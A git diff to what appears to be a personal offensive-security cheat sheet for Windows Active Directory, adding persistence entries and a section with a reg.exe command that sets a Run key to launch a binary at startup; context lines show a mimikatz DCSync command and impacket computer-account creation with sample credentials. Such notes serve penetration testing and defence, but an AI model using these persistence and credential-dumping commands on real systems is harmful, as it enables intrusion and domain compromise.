@@ -49,6 +49,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 * **[Persistence](#persistence)**
 	* Golden Ticket
 	* Skeleton Keys
+	* Shortcuts
+	* msDS-AllowedToDelegateTo
+	* Scheduled Tasks 
+	* AdminSDHolder
+	* Registry Keys
+		* [Execute on startup](#execute-on-startup)
+		* Recycle Bin
 	* [krbtgt Constrained Delegation](#krbtgt-constrained-delegation)
 * **[Remote Access](#remote-authentication-protocol)**
 	* [PSRemoting](#ps-remoting)
@@ -444,7 +451,22 @@ lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc0
 ```
 
 ## Persistence
-### krbtgt Constrained Delegation
+
+## Registry Keys
+### Execute on startup
+There are several registry keys can be added to execute binary on startup based on your need and current user context. 
+```
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+```
+1. Add a new value to one of the KeyName above 
+```
+reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
+```
+
+## krbtgt Constrained Delegation
 1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
 ```
 addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
